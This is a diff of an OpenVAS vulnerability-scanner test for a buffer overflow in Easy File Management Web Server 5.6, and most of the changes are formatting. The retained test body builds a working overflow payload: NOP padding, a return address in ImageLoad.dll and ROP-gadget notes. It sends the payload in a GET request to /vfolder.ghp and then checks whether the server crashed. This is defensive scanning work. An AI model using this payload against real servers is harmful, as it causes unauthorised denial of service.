@@ -1,6 +1,6 @@
 ##############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_easy_file_management_web_server_bof_vuln.nasl 6700 2017-07-12 12:16:21Z cfischer $
+# $Id: gb_easy_file_management_web_server_bof_vuln.nasl 11257 2018-09-06 07:51:44Z mmartin $
 #
 # Easy File Management Web Server USERID Buffer Overflow Vulnerability
 #
@@ -27,41 +27,39 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.805096");
-  script_version("$Revision: 6700 $");
+  script_version("$Revision: 11257 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:16:21 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-06 09:51:44 +0200 (Thu, 06 Sep 2018) $");
   script_tag(name:"creation_date", value:"2015-08-24 16:20:19 +0530 (Mon, 24 Aug 2015)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("Easy File Management Web Server USERID Buffer Overflow Vulnerability");
 
-  script_tag(name: "summary" , value:"The host is running Easy File Management Web
+  script_tag(name:"summary", value:"The host is running Easy File Management Web
   Server and is prone to buffer overflow vulnerability.");
 
-  script_tag(name: "vuldetect" , value:"Send a crafted request via HTTP GET
+  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET
   and check whether it is able to crash or not.");
 
-  script_tag(name: "insight" , value:"The flaw is due to an error when processing
+  script_tag(name:"insight", value:"The flaw is due to an error when processing
   web requests and can be exploited to cause a buffer overflow via an overly long
   string passed to USERID in a HEAD or GET request.");
 
-  script_tag(name: "impact" , value:"Successful exploitation may allow remote
+  script_tag(name:"impact", value:"Successful exploitation may allow remote
   attackers to cause the application to crash, creating a denial-of-service
   condition.
 
   Impact Level: Application");
 
-  script_tag(name: "affected" , value:"Easy File Management Web Server version 5.6");
+  script_tag(name:"affected", value:"Easy File Management Web Server version 5.6");
 
-  script_tag(name: "solution" , value:"No solution or patch was made available
-  for at least one year since disclosure of this vulnerability. Likely none will
-  be provided anymore. General solution options are to upgrade to a newer release,
-  disable respective features, remove the product or replace the product by another
-  one.");
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+Likely none will be provided anymore.
+General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
 
   script_tag(name:"solution_type", value:"WillNotFix");
 
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/37808");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37808");
 
   script_category(ACT_DENIAL);
   script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
@@ -75,17 +73,10 @@ if(description)
 
 
 include("http_func.inc");
-include("http_keepalive.inc");
 
-## Variable Initialization
-http_port = "";
-sndReq = "";
-rcvRes = "";
 
-## Get HTTP Port
 http_port = get_http_port(default:80);
 
-## Confirm the application before trying exploit
 ## product is of low priority
 ## Detect NVT is not required.
 kBanner = get_http_banner(port:http_port);
@@ -102,7 +93,7 @@ host = http_host_name(port:http_port);
 
 UserID= crap(length:80, data:raw_string(0x90)) +
         raw_string(0xc8, 0xd8, 0x01, 0x10) +  crap(length:280,
-        data:raw_string(0x90)) + 
+        data:raw_string(0x90)) +
         # POP EBX # POP ECX # RETN [ImageLoad.dll]
         # Since 0x00 would break the exploit needs to be crafted on the stack
         # contains 00000000 to pass the JNZ instruction
@@ -123,7 +114,6 @@ sndReq = 'GET /vfolder.ghp HTTP/1.1\r\n' +
 
 rcvRes = http_send_recv(port:http_port, data:sndReq);
 
-## confirm the exploit
 if(http_is_dead(port:http_port))
 {
   security_message(http_port);
